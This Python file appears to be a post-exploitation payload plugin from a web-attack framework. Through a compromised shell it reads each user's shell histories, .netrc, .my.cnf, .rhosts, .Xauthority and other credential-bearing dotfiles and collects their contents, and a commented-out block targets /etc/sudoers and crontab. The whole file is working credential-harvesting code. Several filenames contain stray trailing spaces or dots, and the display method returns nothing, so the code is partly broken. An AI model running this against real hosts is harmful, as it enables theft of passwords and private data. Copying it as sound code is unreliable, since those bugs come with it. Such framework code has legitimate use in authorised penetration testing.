from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class users_config_files(base_payload):
    '''
    This payload uses "users_folders" payload to find ".rc" and other configuration files, 
    some of them may contain sensitive information.
    '''
    def api_read(self):
        result = {}
        user_config_files = []
        folders = self.exec_payload('users').values()
        for folder in folders:
            user_config_files.append(folder+'.bashrc')
            user_config_files.append(folder+'.bashrc~')
            user_config_files.append(folder+'.bash_history')
            user_config_files.append(folder+'.bash_profile')
            user_config_files.append(folder+'.gtk-bookmarks')
            user_config_files.append(folder+'.conkyrc')
            user_config_files.append(folder+'.my.cnf')
            user_config_files.append(folder+'.mysql_history.')
            user_config_files.append(folder+'.ldaprc ')
            user_config_files.append(folder+'.emacs')
            user_config_files.append(folder+'.bash_logout')
            user_config_files.append(folder+'.bash_login ')
            user_config_files.append(folder+'.hushlogin')
            user_config_files.append(folder+'.mail.rc')
            user_config_files.append(folder+'.profile ')
            user_config_files.append(folder+'.vimrc')
            user_config_files.append(folder+'.gtkrc')
            user_config_files.append(folder+'.kderc')
            user_config_files.append(folder+'.netrc')
            user_config_files.append(folder+'.rhosts')
            user_config_files.append(folder+'.Xauthority')
            user_config_files.append(folder+'.cshrc')
            user_config_files.append(folder+'.login')
            user_config_files.append(folder+'.joe_state')
            

        #=======================================================================
        # users_config_files.append('/etc/sudoers')
        # users_config_files.append('/etc/inittab')
        # users_config_files.append('/etc/crontab')
        # users_config_files.append('/etc/sysctl.conf')
        # users_config_files.append('/etc/mailname')
        # users_config_files.append('/etc/aliases')
        # users_config_files.append('/etc/pam.conf')
        # #TODO PUT IN APACHE
        # users_config_files.append('/etc/libapache2-mod-jk/workers.properties')
        #=======================================================================

        for file in user_config_files:
            content = self.shell.read(file)
            if content:
                result[ file ] = content
        return result
        
    def run_read(self):
        api_result = self.api_read()
                
        if not api_result:
            return 'No user configuration files found.'
        else:
            rows = []
            rows.append( ['User configuration files',] )
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return
        